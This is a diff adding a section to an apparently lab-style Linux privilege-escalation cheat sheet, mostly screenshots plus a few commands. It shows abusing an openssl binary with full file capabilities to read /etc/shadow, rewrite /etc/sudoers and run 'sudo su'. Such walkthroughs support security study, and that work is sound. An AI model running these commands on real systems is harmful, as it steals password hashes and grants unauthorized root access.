@@ -146,6 +146,45 @@ https://seclists.org/fulldisclosure/2019/Apr/24
 
 ![2023-04-03 20_38_02-kali-linux-2022 4-vmware-amd64 - VMware Workstation](https://user-images.githubusercontent.com/123066149/229597833-52860ee3-8cde-4485-9c69-ecd3f93ee1ec.png)
 
+# ${{\color{green}SUID Files : openssl}}\ $
+
+![image](https://user-images.githubusercontent.com/123066149/230097354-bfead45a-4da0-44d6-8ec0-c9908e221ea0.png)
+
+``getcap *``
+
+### ep = all acpability cela permet d'effectuer l'elevation des privilèges :
+
+![image](https://user-images.githubusercontent.com/123066149/230096352-9df56fed-6be5-4290-a48e-32a591a19815.png)
+
+``man capabilites``
+
+![image](https://user-images.githubusercontent.com/123066149/230097488-fbb14914-e109-4482-9bd1-2c3e8d520ef3.png)
+
+![image](https://user-images.githubusercontent.com/123066149/230097825-d97dea8e-e609-425c-b470-1acde7f6ec08.png)
+
+``./openssl enc -in /etc/shadow``
+
+![image](https://user-images.githubusercontent.com/123066149/230098099-85b70a6f-a841-4739-b05f-f8b5b5985d59.png)
+
+``./openssl enc -in /etc/sudoers > sudoers``
+
+![image](https://user-images.githubusercontent.com/123066149/230098782-293ab9dc-8202-4a0b-a847-bc9800c3b69f.png)
+
+### Edit the sudoers file with vi or nano :
+
+![image](https://user-images.githubusercontent.com/123066149/230099786-d8d76c62-2d2c-4ae3-8f38-bc43b65b140b.png)
+
+### Cat the file and put the file in /etc/sudoers :
+
+ ``cat ./sudoers | ./openssl enc -out /etc/sudoers``
+ 
+ ![image](https://user-images.githubusercontent.com/123066149/230100637-bf027fd7-3562-4216-8639-46cdcef8257c.png)
+
+ ``sudo su``
+ 
+ ![image](https://user-images.githubusercontent.com/123066149/230100868-6a831a4e-8df6-4d08-9708-33e2493c0b8a.png)
+
+
 # ${{\color{green}GIT : git}}\ $
 
 `` find . -name git``
